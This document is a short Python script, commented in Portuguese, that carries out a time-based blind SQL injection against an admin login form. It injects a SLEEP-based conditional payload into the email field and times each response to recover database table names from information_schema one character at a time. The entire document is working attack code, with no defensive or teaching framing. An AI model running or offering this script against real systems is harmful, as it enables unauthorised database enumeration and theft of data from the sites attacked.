import requests, sys, time

url = "http://site.com/admin/login.php?action=login2"
payload = {"email": ""}
caracteres = ' !"#$%&()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~'
tamanho = 60
schema = '' # Deve ser adicionado o nome do schema
tabelas = []

## Script para obter apenas um valor ##

# Iteração sobre a tabela
for linha in range(1,10):
    valor = ''
    # Iteração sobre o campo
    for i in range(1, tamanho + 1):
        # Itera sobre a lista de caracteres
        for c in caracteres:
            # Payload que será enviado. Variável i contém a posição do caractere e variável c contém o caractere a ser testado
            payload["email"] = f'hacker@mail.com" or if(ascii(substring((select table_name from information_schema.tables where table_schema = "{schema}" limit 1 offset {linha}),{i},1))={ord(c)}, sleep(5), 0) #'

            # Marcação do tempo da requisição e o tempo da resposta
            tempo_envio = time.time()
            r = requests.post(url, data=payload)
            tempo_resposta = time.time()

            # Se o servidor demorar mais de 5 segundos para responder, marca o caractere
            if tempo_resposta - tempo_envio > 5:
                valor += c
                break
    tabelas.append(valor)

print("### TABELAS ENCONTRADAS ###")
for t in tabelas:
    print(t)
